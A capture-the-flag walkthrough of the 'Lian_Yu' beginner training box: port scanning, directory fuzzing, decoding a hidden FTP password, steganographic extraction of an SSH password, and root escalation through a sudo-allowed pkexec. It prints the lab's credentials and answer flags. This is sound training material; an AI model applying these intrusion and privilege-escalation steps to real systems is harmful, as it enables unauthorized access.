# Lian_Yu

A beginner level security challenge

# [Task 1] Find the Flags

Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

## #1 - Deploy the VM and Start the Enumeration.

~~~
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43835/tcp6  status
|   100024  1          48319/udp   status
|   100024  1          57610/udp6  status
|_  100024  1          58608/tcp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

A first dirsearch scan reveals a hidden `island` directory.

~~~
$ curl -s http://10.10.222.216/island/
<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>
~~~

We can see a hidden code: `vigilante`. It might be a username? Let's keep it for now.

## #2 - What is the Web Directory you found?

*Hint: In numbers*

A recursive dirsearch scan reveals http://10.10.222.216/island/2100/

~~~
$ curl -s http://10.10.222.216/island/2100/
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
~~~

Answer: `2100`

## #3 - what is the file name you found?

*Hint: How would you search a file/directory by extension?*

In the last URL found, there was a hidden comment disclosing the extension (`.ticket`) of the file we should find. But we don't know the file name. We can use wfuzz to do the search.

~~~
$ ./wfuzz -w /data/src/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.10.97.18/island/2100/FUZZ.ticket
********************************************************
* Wfuzz 2.4.6 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.97.18/island/2100/FUZZ.ticket
Total requests: 220570

===================================================================
ID           Response   Lines    Word     Chars       Payload                                              
===================================================================

[REDACTED]

000010454:   200        6 L      11 W     71 Ch       "green_arrow"                                        

[REDACTED]

~~~

wfuzz has found a valid file: `green_arrow.ticket`

## #4 - what is the FTP Password?

*Hint: Looks like base? https://gchq.github.io/CyberChef/*

Let's check where this leads to:

~~~
$ curl -s http://10.10.97.18/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
~~~

In base58, the string decodes to: `!#th3h00d`, which looks like a password.

Answer: `!#th3h00d`

## #5 - what is the file name with SSH password?

We can now login against the FTP service with `vigilante:!#th3h00d` (remember the username found during the reconnaissance phase?)

~~~
$ ftp 10.10.97.18
Connected to 10.10.97.18 (10.10.97.18).
220 (vsFTPd 3.0.2)
Name (10.10.97.18:unknown): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,97,18,83,105).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> get .other_user
local: .other_user remote: .other_user
227 Entering Passive Mode (10,10,97,18,61,173).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
226 Transfer complete.
2483 bytes received in 0.0029 secs (857.39 Kbytes/sec)
ftp> mget *
~~~

An interesting file was found, named `.other_user`. It contains a long text where we see several occurences of a name: `slade`, which may be a valid user for later.

~~~
$ cat .other_user 
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training 

[REDACTED]
~~~

As far as the pictures, we are provided with 3 files, 1 of which being a corrupted PNG file (`Leave_me_alone.png`):

~~~
$ file *
aa.jpg:             JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1600, components 3
Leave_me_alone.png: data
Queen's_Gambit.png: PNG image data, 1280 x 720, 8-bit/color RGBA, non-interlaced
~~~

Having a look at the header confirms that the PNG header is missing:

~~~
$ xxd Leave_me_alone.png | head
00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
00000010: 0000 034d 0000 01db 0806 0000 0017 a371  ...M...........q
00000020: 5b00 0020 0049 4441 5478 9cac bde9 7a24  [.. .IDATx....z$
00000030: 4b6e 2508 33f7 e092 6466 dea5 557b 6934  Kn%.3...df..U{i4
00000040: 6a69 54fd f573 cebc c03c 9c7e b4d4 a556  jiT..s...<.~...V
00000050: 4955 75d7 5c98 5c22 c2dd 6c3e 00e7 c0e0  IUu.\.\"..l>....
00000060: 4e66 a94a 3d71 3f5e 32c9 085f cccd 60c0  Nf.J=q?^2.._..`.
00000070: c1c1 41f9 7ffe dfff bb2f eb22 fab5 aeab  ..A....../."....
00000080: 7d9d cfe7 f81e 5fcb 49ce ed94 7eb7 d8d7  }....._.I...~...
00000090: 723c c9e9 7492 d3d3 494e c793 9c8f 8b2c  r<..t...IN.....,
~~~

Let's fix it (the correct header for a PNG is `89 50 4E 47 0D 0A 1A 0A`):

~~~
$ printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd conv=notrunc of=Leave_me_alone.png bs=1
$ xxd Leave_me_alone.png | head
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 034d 0000 01db 0806 0000 0017 a371  ...M...........q
00000020: 5b00 0020 0049 4441 5478 9cac bde9 7a24  [.. .IDATx....z$
00000030: 4b6e 2508 33f7 e092 6466 dea5 557b 6934  Kn%.3...df..U{i4
00000040: 6a69 54fd f573 cebc c03c 9c7e b4d4 a556  jiT..s...<.~...V
00000050: 4955 75d7 5c98 5c22 c2dd 6c3e 00e7 c0e0  IUu.\.\"..l>....
00000060: 4e66 a94a 3d71 3f5e 32c9 085f cccd 60c0  Nf.J=q?^2.._..`.
00000070: c1c1 41f9 7ffe dfff bb2f eb22 fab5 aeab  ..A....../."....
00000080: 7d9d cfe7 f81e 5fcb 49ce ed94 7eb7 d8d7  }....._.I...~...
00000090: 723c c9e9 7492 d3d3 494e c793 9c8f 8b2c  r<..t...IN.....,
~~~

The picture discloses a password: `password`.

!["Leave_me_alone.png"](files/Leave_me_alone.png)

What could be this password useful for? One of the pictures (`aa.jpg` hides a secret) that you can decode using this password.

~~~
$ steghide info aa.jpg 
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "ss.zip":
    size: 596.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
~~~

Let's extract the `ss.zip` file:

~~~
$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado                   
$ cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

$ cat shado 
M3tahuman
~~~

This latest string may be the SSH password and has been found in `shado`

## #6 - user.txt

Let's try to connect with `slade:M3tahuman` over SSH (slade was found earlier, on the FTP server)

~~~
$ ssh slade@10.10.97.18
slade@10.10.97.18's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ pwd
/home/slade
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

slade@LianYu:~$ 
~~~

User flag: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

## #7 - root.txt

One of the possible ways to escalate privileges is to check the sudo privileges:

~~~
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
~~~

We can execute `pkexec` as root without password, which is an obvious way to leverage our privileges. Let's check at [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/) what we can do with this executable:

~~~
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# whoami
root
root@LianYu:~# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
~~~

Root flag: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`
